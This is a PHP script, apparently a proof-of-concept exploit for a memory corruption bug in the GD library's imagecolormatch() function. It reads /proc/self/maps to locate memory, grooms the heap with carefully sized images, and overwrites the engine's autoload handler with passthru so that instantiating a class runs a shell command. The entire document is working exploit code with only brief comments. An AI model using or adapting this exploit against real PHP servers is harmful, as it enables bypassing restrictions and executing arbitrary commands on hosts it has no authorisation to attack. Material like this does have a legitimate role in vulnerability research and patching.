<?php

error_reporting(E_ALL);

# Make EG.autoload_func point at something so that we can overwrite the zif_handler
function dummyFunc($class) {
	return false;
}

spl_autoload_register('dummyFunc');

# the offsets of zif_passthru and the global executor_globals must be updated manually
$executor_globals_offset = 0xAF010 + 0xFD0000 + 0x208;
$zif_passthru_offset = 0x42A840 + 0xE2020 + 0x80;

$map = explode("\n", file_get_contents("/proc/self/maps"));
$text_segment_start = hexdec(explode("-", $map[0])[0]);
$globals_segment_start = hexdec(explode("-", $map[0])[0]);

$executor_globals = dechex($globals_segment_start + $executor_globals_offset);
$zif_passthru = dechex($text_segment_start + $zif_passthru_offset);

# Create images in the right order for the corruption to happen
$img1 = imagecreate(0xff, 0xff);
$img2 = imagecreatetruecolor(0xff, 0xff);
imagealphablending($img2, false);

$tile = imagecreate(0xff, 0x01);
$dummy = imagecreate(0x01, 0x01);
$corrupt = imagecreate(0x06, 0x393);
$container = imagecreate(0x01, 0x01);

imagesettile($container, $tile);

# allocate enough colors so that imagecolormatch() buffer will be 2 pages big
for($c = 0; $c < 181; $c++) {
	imagecolorallocate($img1, $c, $c, $c);
}

# prepare the images so that the **pixels of the corrupted image points at tiles **
$y_size = 0x393;
$x = 0;
$y = 0;
$increments = 12288 + 4144;
$increments_added = 0;
$max_iterations = (int)($increments / 0x7f);
for($i = 0; $i < $max_iterations; $i++) {
		
		if($y == $y_size) {
			$y = 0;
			$x++;
		}
		
		imagesetpixel($img2, $x, $y, 0xffffffff);
		imagesetpixel($img1, $x, $y, 204); 
		$y++;
		$increments_added += 0x7f;
	}
	
$rest = ($increments - $increments_added) << 24;
	
if(++$y == $y_size) {
	$y = 0;
	$x++;
}
imagesetpixel($img2, $x, $y, $rest);
imagesetpixel($img1, $x, $y, 204);	


# destroy the dummy, create a slot and corrupt an image
imagedestroy($dummy);
imagecolormatch($img2, $img1);


# use the corrupted **pixels of $corrupt to make the **pixel of $tile point at EG
imagesetpixel($corrupt, 0, 0, hexdec(substr($executor_globals, 10, 2)));
imagesetpixel($corrupt, 1, 0, hexdec(substr($executor_globals, 8, 2)));
imagesetpixel($corrupt, 2, 0, hexdec(substr($executor_globals, 6, 2)));
imagesetpixel($corrupt, 3, 0, hexdec(substr($executor_globals, 4, 2)));
imagesetpixel($corrupt, 4, 0, hexdec(substr($executor_globals, 2, 2)));
imagesetpixel($corrupt, 5, 0, hexdec(substr($executor_globals, 0, 2)));


# tile now points at EG.autoload_func 
imagesetpixel($tile, 48, 0, hexdec(substr($zif_passthru, 10, 2)));
imagesetpixel($tile, 49, 0, hexdec(substr($zif_passthru, 8, 2)));
imagesetpixel($tile, 50, 0, hexdec(substr($zif_passthru, 6, 2)));
imagesetpixel($tile, 51, 0, hexdec(substr($zif_passthru, 4, 2)));
imagesetpixel($tile, 52, 0, hexdec(substr($zif_passthru, 2, 2)));
imagesetpixel($tile, 53, 0, hexdec(substr($zif_passthru, 0, 2)));


new make();







